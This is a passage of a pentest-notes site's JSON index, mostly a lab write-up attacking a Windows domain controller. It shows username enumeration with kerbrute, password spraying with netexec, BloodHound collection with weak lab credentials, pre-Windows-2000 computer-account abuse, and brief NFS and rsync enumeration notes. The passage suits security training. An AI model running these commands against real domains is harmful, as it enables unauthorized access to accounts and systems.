Simple DNS Plus\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e88/tcp   open  kerberos-sec  Microsoft Windows Kerberos \u003cspan class=\"o\"\u003e(\u003c/span\u003eserver time: 2024-07-29 11:32:31Z\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e135/tcp  open  msrpc         Microsoft Windows RPC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e389/tcp  open  ldap          Microsoft Windows Active Directory LDAP \u003cspan class=\"o\"\u003e(\u003c/span\u003eDomain: retro.vl0., Site: Default-First-Site-Name\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_ssl-date: TLS randomness does not represent \u003cspan class=\"nb\"\u003etime\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssl-cert: Subject: \u003cspan class=\"nv\"\u003ecommonName\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eDC.retro.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:DC.retro.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Not valid before: 2024-07-29T11:17:32\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_Not valid after:  2025-07-29T11:17:32\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e445/tcp  open  microsoft-ds?\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e464/tcp  open  kpasswd5?\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP \u003cspan class=\"o\"\u003e(\u003c/span\u003eDomain: retro.vl0., Site: Default-First-Site-Name\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssl-cert: Subject: \u003cspan class=\"nv\"\u003ecommonName\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eDC.retro.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:DC.retro.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Not valid before: 2024-07-29T11:17:32\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_Not valid after:  2025-07-29T11:17:32\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_ssl-date: TLS randomness does not represent \u003cspan class=\"nb\"\u003etime\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3268/tcp open  ldap          Microsoft Windows Active Directory LDAP \u003cspan class=\"o\"\u003e(\u003c/span\u003eDomain: retro.vl0., Site: Default-First-Site-Name\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_ssl-date: TLS randomness does not represent \u003cspan class=\"nb\"\u003etime\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssl-cert: Subject: \u003cspan class=\"nv\"\u003ecommonName\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eDC.retro.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:DC.retro.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Not valid before: 2024-07-29T11:17:32\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_Not valid after:  2025-07-29T11:17:32\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP \u003cspan class=\"o\"\u003e(\u003c/span\u003eDomain: retro.vl0., Site: Default-First-Site-Name\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_ssl-date: TLS randomness does not represent \u003cspan class=\"nb\"\u003etime\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssl-cert: Subject: \u003cspan class=\"nv\"\u003ecommonName\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eDC.retro.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:DC.retro.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Not valid before: 2024-07-29T11:17:32\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_Not valid after:  2025-07-29T11:17:32\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3389/tcp open  ms-wbt-server Microsoft Terminal Services\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssl-cert: Subject: \u003cspan class=\"nv\"\u003ecommonName\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eDC.retro.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Not valid before: 2024-07-28T11:26:17\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_Not valid after:  2025-01-27T11:26:17\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_ssl-date: 2024-07-29T11:33:50+00:00\u003cspan class=\"p\"\u003e;\u003c/span\u003e -1s from scanner time.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e rdp-ntlm-info:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   Target_Name: RETRO\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   NetBIOS_Domain_Name: RETRO\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   NetBIOS_Computer_Name: DC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   DNS_Domain_Name: retro.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   DNS_Computer_Name: DC.retro.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   Product_Version: 10.0.20348\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_  System_Time: 2024-07-29T11:33:10+00:00\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eService Info: Host: DC\u003cspan class=\"p\"\u003e;\u003c/span\u003e OS: Windows\u003cspan class=\"p\"\u003e;\u003c/span\u003e CPE: cpe:/o:microsoft:windows\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHost script results:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_clock-skew: mean: -1s, deviation: 0s, median: -2s\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e smb2-time:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   date: 2024-07-29T11:33:13\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_  start_date: N/A\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e smb2-security-mode:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   311:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_    Message signing enabled and required\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eKerbrute  :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003eJul 29, \u003cspan class=\"m\"\u003e2024\u003c/span\u003e - 14:13:16 \u003cspan class=\"o\"\u003e(\u003c/span\u003eCEST\u003cspan class=\"o\"\u003e)]\u003c/span\u003e exegol-Algo /workspace \u003cspan class=\"c1\"\u003e# kerbrute userenum --dc $t -d retro.vl /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    __             __               __\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   / /_____  _____/ /_  _______  __/ /____\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  / //_/ _ \u003cspan class=\"se\"\u003e\\/\u003c/span\u003e ___/ __ \u003cspan class=\"se\"\u003e\\/\u003c/span\u003e ___/ / / / __/ _ \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e / ,\u0026lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/_/\u003cspan class=\"p\"\u003e|\u003c/span\u003e_\u003cspan class=\"p\"\u003e|\u003c/span\u003e\u003cspan class=\"se\"\u003e\\_\u003c/span\u003e__/_/  /_.___/_/   \u003cspan class=\"se\"\u003e\\_\u003c/span\u003e_,_/\u003cspan class=\"se\"\u003e\\_\u003c/span\u003e_/\u003cspan class=\"se\"\u003e\\_\u003c/span\u003e__/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eVersion: dev \u003cspan class=\"o\"\u003e(\u003c/span\u003en/a\u003cspan class=\"o\"\u003e)\u003c/span\u003e - 07/29/24 - Ronnie Flathers @ropnop\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e2024/07/29 14:14:41 \u0026gt;  Using KDC\u003cspan class=\"o\"\u003e(\u003c/span\u003es\u003cspan class=\"o\"\u003e)\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e2024/07/29 14:14:41 \u0026gt;   10.10.65.99:88\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e2024/07/29 14:14:42 \u0026gt;  \u003cspan class=\"o\"\u003e[\u003c/span\u003e+\u003cspan class=\"o\"\u003e]\u003c/span\u003e VALID USERNAME:       guest@retro.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e2024/07/29 14:14:45 \u0026gt;  \u003cspan class=\"o\"\u003e[\u003c/span\u003e+\u003cspan class=\"o\"\u003e]\u003c/span\u003e VALID USERNAME:       administrator@retro.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e2024/07/29 14:15:25 \u0026gt;  \u003cspan class=\"o\"\u003e[\u003c/span\u003e+\u003cspan class=\"o\"\u003e]\u003c/span\u003e VALID USERNAME:       Guest@retro.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e2024/07/29 14:15:25 \u0026gt;  \u003cspan class=\"o\"\u003e[\u003c/span\u003e+\u003cspan class=\"o\"\u003e]\u003c/span\u003e VALID USERNAME:       Administrator@retro.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e2024/07/29 14:15:43 \u0026gt;  \u003cspan class=\"o\"\u003e[\u003c/span\u003e+\u003cspan class=\"o\"\u003e]\u003c/span\u003e VALID USERNAME:       tblack@retro.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e2024/07/29 14:16:02 \u0026gt;  \u003cspan class=\"o\"\u003e[\u003c/span\u003e+\u003cspan class=\"o\"\u003e]\u003c/span\u003e VALID USERNAME:       banking@retro.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e2024/07/29 14:17:06 \u0026gt;  \u003cspan class=\"o\"\u003e[\u003c/span\u003e+\u003cspan class=\"o\"\u003e]\u003c/span\u003e VALID USERNAME:       trainee@retro.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e2024/07/29 14:17:40 \u0026gt;  \u003cspan class=\"o\"\u003e[\u003c/span\u003e+\u003cspan class=\"o\"\u003e]\u003c/span\u003e VALID USERNAME:       GUEST@retro.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e2024/07/29 14:25:01 \u0026gt;  \u003cspan class=\"o\"\u003e[\u003c/span\u003e+\u003cspan class=\"o\"\u003e]\u003c/span\u003e VALID USERNAME:       Banking@retro.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e2024/07/29 14:32:54 \u0026gt;  \u003cspan class=\"o\"\u003e[\u003c/span\u003e+\u003cspan class=\"o\"\u003e]\u003c/span\u003e VALID USERNAME:       jburley@retro.vl\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003ePassword spraying :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enetexec smb 10.10.65.99 -u usert.txt -p usert.txt --no-bruteforce --continue-on-success\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eEnumerate share :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enetexec smb 10.10.65.99 -u \u003cspan class=\"s2\"\u003e\u0026#34;trainee\u0026#34;\u003c/span\u003e -p \u003cspan class=\"s2\"\u003e\u0026#34;trainee\u0026#34;\u003c/span\u003e --group\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eTodolist :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThomas,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eafter convincing the finance department to get rid of their ancienct banking software\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eit is finally \u003cspan class=\"nb\"\u003etime\u003c/span\u003e to clean up the mess they made. We should start with the pre created\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecomputer account. That one is older than me.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eBest\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eJames#\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eBloodhound :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ebloodhound-python -d \u003cspan class=\"s1\"\u003e\u0026#39;retro.VL\u0026#39;\u003c/span\u003e -u \u003cspan class=\"s1\"\u003e\u0026#39;trainee\u0026#39;\u003c/span\u003e -p \u003cspan class=\"s1\"\u003e\u0026#39;trainee\u0026#39;\u003c/span\u003e -ns  10.10.65.99  -dc dc.retro.vl -c all\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epre2k auth -u banking -p banking -d retro.vl -dc-ip 10.10.65.99 -verbose\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003echangepasswd.py retro.vl/banking\u003cspan class=\"se\"\u003e\\$\u003c/span\u003e@10.10.65.99 -newpass \u003cspan class=\"s1\"\u003e\u0026#39;TestPass!2\u0026#39;\u003c/span\u003e -p rpc-samr\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cp\u003e// Not working but good to try ;)\u003c/p\u003e","tags":[],"title":"Retro"},{"content":"Get some information :\nshowmount -e\rMount the directories :\nsudo mount -t nfs -o vers=4 10.10.121.175:/profiles /mntc\rClean :\nsudo umount /mnt\r","date":"2023-09-07","id":95,"permalink":"/notes/services/rpcbind/","summary":"\u003cp\u003eGet  some information :\u003c/p\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eshowmount -e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cp\u003eMount the directories :\u003c/p\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo mount -t nfs -o \u003cspan class=\"nv\"\u003evers\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e4\u003c/span\u003e 10.10.121.175:/profiles /mntc\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cp\u003eClean :\u003c/p\u003e","tags":[],"title":"RPCbind"},{"content":"\r#Enumeration nc -vn target 873\r# Listing a shared folder rsync -av --list-only rsync://192.168.0.123/shared_name # Copying files from a shared folder rsync -av rsync://192.168.0.123:8730/shared_name ./rsyn_shared\r","date":"2023-09-07","id":96,"permalink":"/notes/services/rsync/","summary":"\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#Enumeration\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enc -vn target \u003cspan class=\"m\"\u003e873\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan 